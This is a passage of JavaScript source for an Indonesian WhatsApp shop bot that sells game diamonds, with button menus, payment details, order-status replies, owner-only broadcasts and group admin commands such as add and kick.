contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 700 M = Rp 50.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 1 B = Rp 65.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 1 B = Rp 65.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if (sub_yt_zeeone_ofc == `⦿ 1.5 B = Rp 100.000 💰`) {
buttons = [
{buttonId: 'higs_domino', buttonText: {displayText: '⬅️ Back'}, type: 1},
{buttonId: 'payment', buttonText:{displayText: '💸 Payment'}, type: 1}
]

buttonMessage = {
contentText: `Halo kak @${sender.split('@')[0]} 🥰\n\n• Pilih payment jika ingin membeli ⦿ 1.5 B = Rp 100.000 💰\n• Pilih back jika ingin kembali ke list diamond`,
footerText: `${shop}` ,
buttons: buttons,
headerType: 1
}
alpha.sendMessage(from, buttonMessage, MessageType.buttonsMessage,{quoted:ftroli,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
} 
if(subscribezeeoneofc == 'diamond_fff'){
	let content11 = fs.readFileSync(`image/${thumbnail}`)
const media11 = await alpha.prepareMessage(from, content11, MessageType.location, {thumbnail: content11})
let bacotlu11 = media11.message["ephemeralMessage"] ? media11.message.ephemeralMessage : media11

const buttons11 = [
  {buttonId: 'diamond_ff', buttonText: {displayText: 'List Diamond'}, type: 1},
  {buttonId: 'diamond_ffff', buttonText: {displayText: 'List Member'}, type: 1},
  ]

const btn11 = {
    contentText: `Halo kak @${sender.split('@')[0]} silahkan dipilih untuk list diamond & member list nya `,
    footerText: `${tampilTanggal}${enter}${tampilWaktu}`,
    buttons: buttons11,
    headerType: 6,
    locationMessage: bacotlu11.message.locationMessage
}

alpha.sendMessage(from,  btn11, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender],
            },
			quoted: fkontak,sendEphemeral: true 
			})
	}
switch (command) {
	case 'menu': case 'help': case 'shop':
	let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: content1})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'diamond_fff', buttonText: {displayText: '💎 Diamond FF'}, type: 1},
  {buttonId: 'diamond_ml', buttonText: {displayText: '💎 Diamond ML'}, type: 1},
  {buttonId: 'higs_domino', buttonText:{displayText: '🎯 DOMINO HIGS'}, type: 1}
]

const btn1 = {
    contentText: `Halo kak @${sender.split('@')[0]} saya adalah bot whatsApp khusus  untuk membantu owner saya jualan.Semoga kamu suka 💌`,
    footerText: `${tampilTanggal}${enter}${tampilWaktu}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender],
            },
			quoted: fkontak,sendEphemeral: true 
			})
break 
case 'link_aja':
gambar_linkaja = `${qr_code_linkaja}`
	let gambar_link_nya = await getBuffer(gambar_linkaja)
	ini_bayar = `hay ${pushname}, ini adalah detail pembayaran kamu, bayar sesuai nominal yg kamu pilih,`
await alpha.sendMessage(from, gambar_link_nya, image, {thumbnail: gambar_link_nya, quoted: mek, caption: `Scan Qr diatas\n\nJika anda ingin menggunakan nomor silahkan transfer ke nomor di bawah\n${nomor_linkaja}\n\nJangan lupa mengisi format order berikut setelah melakukan pembayaran\n\n*Nama*  : \n*ID*  : \n*Nick Name* : \n*Nominal* :`})
break
case 'vvip':
        source =`Source Script Bot : bit.ly/ytzeeoneofc`
alpha.sendMessage(from, source, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
					break
case 'bcsticker':
case 'bcstik':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: Mimetype.gif,quoted : ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break     
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/

        
        case 'owner':  
        case 'creator':  
                    members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard2 = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${setting.ownername}\n`
		            + `ORG: OCHOBOTZ;\n`
		            + `TEL;type=CELL;type=VOICE;waid=${setting.ownerNumber}:${setting.ownerNumberr}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${setting.ownername}`, vcard: vcard2}, contact, { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
		           .then((res) => alpha.sendMessage(from, 'Nih kontak ownerku', text, {quoted: mek}))
                break
		 case 'on':
		            if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		            offline = false
		            fakeitem(' ```ANDA TELAH ONLINE``` ')
		            break       
		  case 'off':
		            if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(' ```ANDA TELAH OFFLINE``` ')
		            break   
		    case 'public':
		              if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		          	if (banChats === false) return
		          	banChats = false
		          	fakeitem(`「 *PUBLIC-MODE* 」`)
		          	break
			case 'self':
			          if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
		          	if (banChats === true) return
		          	banChats = true
		          	fakeitem(`「 *SELF-MODE* 」`)
		          	break
		 	case 'hidetag':
		     case '_`':
		     case '.':
		if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					break
			case 'setname':
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					if (!isGroupAdmins && !isBotGroupAdmins) return fakegroup('```ONLY ADMIN LORD```')
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, 'SUKSES  Mengubah Nama Grup', text, { quoted: mek })
					break 
case 'setdesc':
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					if (!isGroupAdmins) return fakegroup('```ONLY ADMIN LORD```')
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*SUKSES  Mengubah Desk Grup', text, { quoted: mek })
					break   
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('```Masukkan text```')
					ini_bc = args.join(' ')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmediaa)
					for (let _ of anu) {
					alpha.sendMessage(_.jid, bc, image, {quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${ini_bc}`})
					}
					fakegroup('```SUKSESS BROADCAST```')
					} else {
					for (let _ of anu) {
						alpha.sendMessage(_.jid, `*BROADCAST* \n\n${ini_bc}`, text, { contextInfo: { mentionedJid: [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
					 //sendMess(_.jid, `*「 Alphabot Broadcast  」*\n\n${body.slice(4)}`)
					}
					fakegroup('```SUKSESS BROADCAST```')
					}
					break
			case 'd': case 'done':
			apanih = `「 *PESANAN SELESAI* 」\n\nNama : ${pushname}\nNomor : ${sender.split('@')[0]}\nHari : ${tampilTanggal}\nWaktu : ${tampilWaktu}\nStatus : Pesanan Selesai.\n\nTerimakasih atas pesanannya, kami tunggu pesanan berikutnya 😊`
			alpha.sendMessage(from, apanih, text, {quoted : ftoko, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
			break
			case 'p': case 'proses':
			apanih = `「 *PESANAN DIPROSES* 」\n\nNama : ${pushname}\nNomor : ${sender.split('@')[0]}\nHari : ${tampilTanggal}\nWaktu : ${tampilWaktu}\nStatus : Pesanan sedang di proses!!!\n\nSetelah pesanan selesai ketik ${prefix}done yang menandakan bahwa pesanan telah telesai 🐣`
			alpha.sendMessage(from, apanih, text, {quoted : ftoko, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
			break
			case 'antilink':
              if (!isGroup) return reply('only gc')
              if (!isBotGroupAdmins && !isGroupAdmins) return reply('khusus admin')
              if (args[0].toLowerCase() === 'on'){
              if (isAntiLink) return reply('udh on')
              antilink.push(from)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply('```[ ✓ ]```Antilink di aktifkan')
              } else if (args[0].toLowerCase() === 'off'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
              reply('```[ ✓ ]```Antilink di nonaktifkan')
              } else if (!q) {
              	reply('pilih on / off')
              }
          case 'add':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} 629xxxx*`)
orang = args[0] + '@s.whatsapp.net'
response = await alpha.groupAdd(from, [orang])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Orang yang anda add sudah ada didalam Group!')
else if(inv[0].code == 403){
alpha.sendMessage(from, `Mengirim Undangan Group Ke @${q.split('@')[0]}`, MessageType.text, {quoted: mek, contextInfo: {mentionedJid: [orang]}})
alpha.sendGroupV4Invite(from, orang, inv[0].invite_code, inv[0].invite_code_exp, groupMetadata.subject , `Salah Satu Admin Mengundang Anda Masuk Ke Sini Silahkan Klik Bergabung Untuk Masuk`)
}
break

case 'radd':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (sen.message.extendedTextMessage === undefined || sen.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Add!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, Add: @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupAdd(from, mentioned)
break

case 'kick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if(!q)return reply(`*Format salah!*\n\n*Example : ${prefix + command} @tag*`)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
yau = q.split('@')[1] + '@s.whatsapp.net'
alpha.groupRemove(from, [yau])
reply(`Succses kick target!`)
break

case 'rkick':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply pesan yg ingin di Kick!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
alpha.groupRemove(from, mentioned)
break
				default:
				
				if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./stik/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
		
		
	
	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	}
}


	
    